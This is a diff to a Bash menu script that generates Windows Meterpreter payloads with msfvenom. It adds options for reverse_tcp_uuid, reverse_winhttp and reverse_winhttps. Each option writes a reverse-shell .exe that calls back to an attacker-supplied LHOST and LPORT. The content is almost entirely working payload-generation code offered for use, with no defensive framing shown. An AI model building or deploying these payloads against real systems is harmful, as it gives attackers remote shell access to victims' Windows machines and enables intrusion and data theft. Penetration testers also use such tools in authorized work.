@@ -47,6 +47,9 @@ windows () {
     echo -e "+ ${White}[2] ${Purple}windows/meterpreter/reverse_http         ${Blue}         +"
     echo -e "+ ${White}[3] ${Purple}windows/meterpreter/reverse_tcp_dns         ${Blue}      +"
     echo -e "+ ${White}[4] ${Purple}windows/meterpreter/reverse_https         ${Blue}        +"
+    echo -e "+ ${White}[5] ${Purple}windows/meterpreter/reverse_tcp_uuid        ${Blue}      +"
+    echo -e "+ ${White}[6] ${Purple}windows/meterpreter/reverse_winhttp          ${Blue}     +"
+    echo -e "+ ${White}[7] ${Purple}windows/meterpreter/reverse_winhttps        ${Blue}      +"
     echo -e "${Blue}+-------------------------------------------------------+"
     sleep 0.3
     echo -ne "${Green}[#] Choose a payload: ${White}" 
@@ -85,6 +88,30 @@ windows () {
         echo
         msfvenom -p windows/meterpreter/reverse_https LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
         payload='windows/meterpreter/reverse_https' ;;
+    
+        5)
+        target
+        echo 
+        echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
+        echo
+        msfvenom -p windows/meterpreter/reverse_tcp_uuid LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
+        payload='windows/meterpreter/reverse_tcp_uuid' ;;
+
+        6)
+        target
+        echo 
+        echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
+        echo
+        msfvenom -p windows/meterpreter/reverse_winhttp LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
+        payload='windows/meterpreter/reverse_winhttp' ;;
+    
+        7)
+        target
+        echo 
+        echo -ne "\033[01;36m[*] Payload is being created"; sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".";sleep 0.3;echo -ne ".\n"
+        echo
+        msfvenom -p windows/meterpreter/reverse_winhttps LHOST=$ip LPORT=$port -f exe > ~/Desktop/payloads/$file.exe 2>/dev/null
+        payload='windows/meterpreter/reverse_winhttps' ;;
     
         *)
         echo -e "${Cyan}[*] INVALID CHOICE!" 
